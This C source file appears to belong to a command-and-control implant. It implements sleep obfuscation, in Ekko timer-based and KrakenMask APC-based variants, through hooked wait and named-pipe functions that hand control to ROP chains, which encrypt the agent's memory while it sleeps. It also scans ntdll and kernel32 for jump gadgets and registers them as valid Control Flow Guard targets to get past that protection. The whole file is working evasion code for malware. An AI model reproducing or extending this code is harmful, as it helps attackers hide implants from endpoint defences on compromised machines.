
#include "hooks.h"
#include "cfg.h"

static const DWORD g_ProtectionMap[8] = {
    PAGE_NOACCESS,          PAGE_EXECUTE,
    PAGE_READONLY,          PAGE_EXECUTE_READ,
    PAGE_READWRITE,         PAGE_EXECUTE_READWRITE,
    PAGE_READWRITE,         PAGE_EXECUTE_READWRITE
};

static void restore_section_permissions(void)
{
    if (!g_ImageBase) return;

    unsigned char *base = (unsigned char *)g_ImageBase;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
        &nt->OptionalHeader, nt->FileHeader.SizeOfOptionalHeader);

    DWORD old = 0;
    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        void  *addr = base + sec->VirtualAddress;
        DWORD  size = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        if (!size) continue;

        unsigned idx = 0;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) idx |= 1;
        if (sec->Characteristics & IMAGE_SCN_MEM_READ)    idx |= 2;
        if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)   idx |= 4;

        SIZE_T region_size = (SIZE_T)size;
        NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&addr, &region_size, g_ProtectionMap[idx], &old);
    }

    SIZE_T header_region_size = (SIZE_T)nt->OptionalHeader.SizeOfHeaders;
    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID*)&base, &header_region_size, PAGE_READONLY, &old);
    //cfg_refresh_agent();
    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base, g_ImageSize);
}

/* Mark sleep obfuscation gadgets as valid CFG targets.
   These are mid-function addresses in ntdll/kernel32 used as
   indirect call targets by the ROP chain. */
void EnableCFGForGadgets(void) {
    StealthDbg("CFG: marking gadgets...\n");
    
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    HMODULE hK32   = KERNEL32$GetModuleHandleA("kernel32.dll");
    HMODULE hAdvapi= KERNEL32$GetModuleHandleA("advapi32.dll");
    
    if (restore_section_permissions)                    _cfg_mark_single((PVOID)restore_section_permissions);
    if (g_pWaitForMultipleObjects)                      _cfg_mark_single_image(hK32, (PVOID)g_pWaitForMultipleObjects);
    if (g_pConnectNamedPipe)                            _cfg_mark_single_image(hK32, (PVOID)g_pConnectNamedPipe);

    
#ifdef SLEEP_OBF_EKKO
    if (g_JmpGadget)                                    _cfg_mark_single((PVOID)g_JmpGadget);
    if (g_NtContinueGadget)                             _cfg_mark_single_image(hNtdll, (PVOID)g_NtContinueGadget);
    if (g_pSysFunc032)                                  _cfg_mark_single_image(hAdvapi, (PVOID)g_pSysFunc032);
    if (g_pWaitForSingleObjectEx)                       _cfg_mark_single_image(hK32, (PVOID)g_pWaitForSingleObjectEx);
    if (g_pWaitForSingleObject)                         _cfg_mark_single_image(hK32, (PVOID)g_pWaitForSingleObject);
    if (g_pGetThreadContext)                            _cfg_mark_single_image(hK32, (PVOID)g_pGetThreadContext);
    if (g_pSetThreadContext)                            _cfg_mark_single_image(hK32, (PVOID)g_pSetThreadContext);
    
    if (g_pVirtualProtect)                              _cfg_mark_single_image(hK32, (PVOID)g_pVirtualProtect);
    if (g_pSetEvent)                                    _cfg_mark_single_image(hK32, (PVOID)g_pSetEvent);
    if (g_pRtlMoveMemory)                               _cfg_mark_single_image(hNtdll, (PVOID)g_pRtlMoveMemory);

#endif
#ifdef SLEEP_OBF_KRAKEN_MASK
    if (g_NtContinueGadget)                             _cfg_mark_single_image(hNtdll, (PVOID)g_NtContinueGadget);
    if (g_JmpRdiGadget)                                 _cfg_mark_single((PVOID)g_JmpRdiGadget);
    if (g_pNtTestAlert)                                 _cfg_mark_single((PVOID)g_pNtTestAlert);
    if (KERNEL32$HeapAlloc)                             _cfg_mark_single_image(hK32, (PVOID)KERNEL32$HeapAlloc);
    if (KERNEL32$GetProcessHeap)                        _cfg_mark_single_image(hK32, (PVOID)KERNEL32$GetProcessHeap);
    if (KERNEL32$HeapFree)                              _cfg_mark_single_image(hK32, (PVOID)KERNEL32$HeapFree);
    if (g_pRtlCaptureContext)                           _cfg_mark_single_image(hNtdll, (PVOID)g_pRtlCaptureContext);
    if (g_pNtAlertResumeThread)                         _cfg_mark_single_image(hNtdll, (PVOID)g_pNtAlertResumeThread);
    if (g_pNtSignalAndWaitForSingleObject)              _cfg_mark_single_image(hNtdll, (PVOID)g_pNtSignalAndWaitForSingleObject);
    if (g_pNtWaitForSingleObject)                       _cfg_mark_single_image(hNtdll, (PVOID)g_pNtWaitForSingleObject);
    if (g_pNtSetEvent)                                  _cfg_mark_single_image(hNtdll, (PVOID)g_pNtSetEvent);
    if (g_pSysFunc032)                                  _cfg_mark_single_image(hAdvapi, (PVOID)g_pSysFunc032);
    if (KERNEL32$SetThreadContext)                      _cfg_mark_single_image(hK32, (PVOID)KERNEL32$SetThreadContext);
    if (NTDLL$NtSetContextThread)                       _cfg_mark_single_image(hNtdll, (PVOID)NTDLL$NtSetContextThread);
    if (g_pRtlExitUserThread)                           _cfg_mark_single_image(hNtdll, (PVOID)g_pRtlExitUserThread);
    if (g_pNtSuspendThread)                             _cfg_mark_single_image(hNtdll, (PVOID)g_pNtSuspendThread);
    if (g_pNtResumeThread)                              _cfg_mark_single_image(hNtdll, (PVOID)g_pNtResumeThread);
    if (g_pRtlMoveMemory)                               _cfg_mark_single_image(hNtdll, (PVOID)g_pRtlMoveMemory);

#endif
    StealthDbg("CFG: gadget marking complete\n");
}

/* Re-mark agent's executable sections after sleep VP cycle.
   Called from restore_section_permissions or as ROP stage.
   Only marks executable sections, not the whole image. */
void cfg_refresh_agent(void) {
    if (!g_ImageBase || !g_ImageSize) return;

    /* Walk the PE to find executable sections */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ImageBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((char*)g_ImageBase + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;
        PVOID  secBase = (char*)g_ImageBase + sec->VirtualAddress;
        SIZE_T secSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        _cfg_mark_region(secBase, secSize);
    }
}

/* ── Gadget scanner ─────────────────────────────────────────────────── */

SIZE_T GetSectionSize(ULONG_PTR ModuleBase, LPCSTR SectionName)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ModuleBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(ModuleBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
        if (MSVCRT$_strnicmp((CHAR *)pSec[i].Name, SectionName, IMAGE_SIZEOF_SHORT_NAME) == 0)
            return pSec[i].Misc.VirtualSize;
    return 0;
}

ULONG_PTR FindGadget(ULONG_PTR ModuleBase, BYTE RegValue)
{
    ULONG_PTR hits[10] = {0};
    DWORD     count    = 0;
    PBYTE     base     = (PBYTE)(ModuleBase + 0x1000);
    SIZE_T    size     = GetSectionSize(ModuleBase, ".text");

    if (!size) return 0;

    for (SIZE_T i = 0; i < size - 1 && count < 10; i++)
        if (base[i] == 0xFF && base[i + 1] == RegValue)
            hits[count++] = (ULONG_PTR)&base[i];

    return count ? hits[KERNEL32$GetTickCount() % count] : 0;
}

/* ── Shared helpers (both Ekko variants) ────────────────────────────── */

#if defined(SLEEP_OBF_EKKO) || defined(SLEEP_OBF_KRAKEN_MASK)

ULONG RndThreadId(ULONG CurrentTid)
{
    ULONG RandomTid = 0, RetLen = 0;
    ULONG Pid = (ULONG)KERNEL32$GetCurrentProcessId();

    NTSTATUS st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &RetLen);
    if (st != STATUS_INFO_LENGTH_MISMATCH) return CurrentTid;

    PVOID buf = KERNEL32$VirtualAlloc(NULL, RetLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return CurrentTid;

    st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buf, RetLen, &RetLen);
    if (st != 0) { KERNEL32$VirtualFree(buf, 0, MEM_RELEASE); return CurrentTid; }

    PSYSTEM_PROCESS_INFORMATION p = (PSYSTEM_PROCESS_INFORMATION)buf;
    while (TRUE) {
        if ((ULONG_PTR)p->UniqueProcessId == (ULONG_PTR)Pid) {
            for (ULONG i = 0; i < p->NumberOfThreads; i++) {
                ULONG tid = (ULONG)(ULONG_PTR)p->Threads[i].ClientId.UniqueThread;
                if (tid != CurrentTid) { RandomTid = tid; break; }
            }
            break;
        }
        if (!p->NextEntryOffset) break;
        p = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)p + p->NextEntryOffset);
    }
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    return RandomTid ? RandomTid : CurrentTid;
}

VOID HandleUnexpectedError(HOOK_TYPE Hook, HOOK_ARGS *Args)
{
    switch (Hook) {
    case WAIT_FOR_SINGLE_OBJECT_EX:
        Args->WaitForSingleObjectExArgs.OriginalFunc(
            Args->WaitForSingleObjectExArgs.hObject,
            Args->WaitForSingleObjectExArgs.dwMilliseconds,
            Args->WaitForSingleObjectExArgs.bAlertable);
        break;
    case WAIT_FOR_MULTIPLE_OBJECTS:
        Args->WaitForMultipleObjectsArgs.OriginalFunc(
            Args->WaitForMultipleObjectsArgs.nCount,
            Args->WaitForMultipleObjectsArgs.lpHandles,
            Args->WaitForMultipleObjectsArgs.bWaitAll,
            Args->WaitForMultipleObjectsArgs.dwMilliseconds);
        break;
    case CONNECT_NAMED_PIPE:
        Args->ConnectNamedPipeArgs.OriginalFunc(
            Args->ConnectNamedPipeArgs.hPipe,
            Args->ConnectNamedPipeArgs.lpOverlapped);
        break;
    }
}

__attribute__((optimize("O2"), noinline))
VOID DetourWaitForMultipleObjects(WAIT_FOR_MULTIPLE_OBJECTS_ARGS *Args)
{
    Args->returnValue = Args->OriginalFunc(Args->nCount, Args->lpHandles, Args->bWaitAll, Args->dwMilliseconds);
}

#endif /* SLEEP_OBF_EKKO || SLEEP_OBF_KRAKEN_MASK */

/* ── Function resolution ────────────────────────────────────────────── */

VOID ResolveHookFunctions(VOID)
{
    HMODULE hK32   = KERNEL32$GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");

    g_pWaitForSingleObjectEx  = (fnWaitForSingleObjectEx) KERNEL32$GetProcAddress(hK32, "WaitForSingleObjectEx");
    g_pWaitForMultipleObjects = (fnWaitForMultipleObjects)KERNEL32$GetProcAddress(hK32, "WaitForMultipleObjects");
    g_pConnectNamedPipe       = (fnConnectNamedPipe)      KERNEL32$GetProcAddress(hK32, "ConnectNamedPipe");

    g_NtContinueGadget = (ULONG_PTR)KERNEL32$GetProcAddress(hNtdll, "NtContinue");


#if defined(SLEEP_OBF_EKKO) || defined(SLEEP_OBF_KRAKEN_MASK)
    HMODULE hAdvapi         = KERNEL32$LoadLibraryA("advapi32.dll");

    g_JmpGadget             = FindGadget((ULONG_PTR)hNtdll, 0x23); /* FF 23 = jmp [rbx] */
    g_JmpRdiGadget          = FindGadget((ULONG_PTR)hK32, 0xE7);   /* FF E7 = jmp rdi   */

    g_pNtContinue           = (fnNtContinue)            KERNEL32$GetProcAddress(hNtdll,     "NtContinue");
    g_pRtlCaptureContext    = (fnRtlCaptureContext)     KERNEL32$GetProcAddress(hNtdll,     "RtlCaptureContext");
    g_pSysFunc032           = (fnSystemFunction032)     KERNEL32$GetProcAddress(hAdvapi,    "SystemFunction032");
    g_pWaitForSingleObject  = (fnWaitForSingleObject)   KERNEL32$GetProcAddress(hK32,       "WaitForSingleObject");
    g_pGetThreadContext     = (fnGetThreadContext)      KERNEL32$GetProcAddress(hK32,       "GetThreadContext");
    g_pSetThreadContext     = (fnSetThreadContext)      KERNEL32$GetProcAddress(hK32,       "SetThreadContext");
    g_pVirtualProtect       = (fnVirtualProtect)        KERNEL32$GetProcAddress(hK32,       "VirtualProtect");
    g_pSetEvent             = (fnSetEvent)              KERNEL32$GetProcAddress(hK32,       "SetEvent");
    g_pRtlMoveMemory        = (fnRtlMoveMemory)         KERNEL32$GetProcAddress(hNtdll,     "RtlMoveMemory");
#endif

#ifdef SLEEP_OBF_KRAKEN_MASK
    g_pNtTestAlert                    = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtTestAlert");
    g_pNtWaitForSingleObject          = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtWaitForSingleObject");
    g_pNtSetEvent                     = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtSetEvent");
    g_pNtSignalAndWaitForSingleObject = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    g_pNtAlertResumeThread            = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtAlertResumeThread");
    g_pRtlExitUserThread              = (PVOID)KERNEL32$GetProcAddress(hNtdll, "RtlExitUserThread");
    g_pNtSuspendThread                = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtSuspendThread");
    g_pNtResumeThread                 = (PVOID)KERNEL32$GetProcAddress(hNtdll, "NtResumeThread");
#endif
}

/* ── Ekko (timer-based) technique ──────────────────────────────────── */
#include "ekko.c"


/* ── KrakenMask (APC-based) technique ──────────────────────────────── */
#include "kraken_mask.c"


/* ── Hook dispatch wrappers ─────────────────────────────────────────── */

#ifdef SLEEP_OBF_EKKO
static DWORD _WaitForSingleObjectEx_Obf(HANDLE h, DWORD ms, BOOL alert) {
    WAIT_FOR_SINGLE_OBJECT_EX_ARGS wa = { h, ms, alert, g_pWaitForSingleObjectEx };
    HOOK_ARGS a = { .WaitForSingleObjectExArgs = wa };
    EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, &a);
    return WAIT_OBJECT_0;
}
#endif

#ifdef SLEEP_OBF_KRAKEN_MASK
static DWORD _WaitForSingleObjectEx_Obf(HANDLE h, DWORD ms, BOOL alert) {
    WAIT_FOR_SINGLE_OBJECT_EX_ARGS wa = { h, ms, alert, g_pWaitForSingleObjectEx };
    HOOK_ARGS a = { .WaitForSingleObjectExArgs = wa };
    KrakenMaskObf(WAIT_FOR_SINGLE_OBJECT_EX, &a);
    return WAIT_OBJECT_0;
}
#endif

__attribute__((optimize("O2"), noinline))
DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable)
{
    if (!g_pWaitForSingleObjectEx) {
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return WAIT_FAILED;
    }

#if defined(SLEEP_OBF_EKKO) || defined(SLEEP_OBF_KRAKEN_MASK)
    if (dwMilliseconds > 1000)
        return _WaitForSingleObjectEx_Obf(hHandle, dwMilliseconds, bAlertable);
#endif

    if (dwMilliseconds < 1000)
        dwMilliseconds = 100;
    return g_pWaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable);
}

__attribute__((optimize("O2"), noinline))
DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
{
    return _WaitForSingleObjectEx(hHandle, dwMilliseconds, FALSE);
}

__attribute__((optimize("O2"), noinline))
DWORD _WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds)
{
    if (!g_pWaitForMultipleObjects) {
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return WAIT_FAILED;
    }

#if defined(SLEEP_OBF_EKKO) || defined(SLEEP_OBF_KRAKEN_MASK)
    if (dwMilliseconds > 200) {
        WAIT_FOR_MULTIPLE_OBJECTS_ARGS wa = { nCount, lpHandles, bWaitAll, dwMilliseconds, g_pWaitForMultipleObjects };
        HOOK_ARGS a = { .WaitForMultipleObjectsArgs = wa };
#ifdef SLEEP_OBF_KRAKEN_MASK
        KrakenMaskObf(WAIT_FOR_MULTIPLE_OBJECTS, &a);
        return g_pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, 0);
#else
        EkkoObf(WAIT_FOR_MULTIPLE_OBJECTS, &a);
#endif
        return a.WaitForMultipleObjectsArgs.returnValue;
    }
#endif

    return g_pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds);
}

__attribute__((optimize("O2"), noinline))
BOOL _ConnectNamedPipe(HANDLE hPipe, LPOVERLAPPED lpOverlapped)
{
    if (!g_pConnectNamedPipe) {
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return FALSE;
    }

#if defined(SLEEP_OBF_EKKO) || defined(SLEEP_OBF_KRAKEN_MASK)
    CONNECT_NAMED_PIPE_ARGS ca = { hPipe, lpOverlapped, g_pConnectNamedPipe };
    HOOK_ARGS a = { .ConnectNamedPipeArgs = ca };
#ifdef SLEEP_OBF_KRAKEN_MASK
    KrakenMaskObf(CONNECT_NAMED_PIPE, &a);
#else
    EkkoObf(CONNECT_NAMED_PIPE, &a);
#endif
    return TRUE;
#else
    return g_pConnectNamedPipe(hPipe, lpOverlapped);
#endif
}
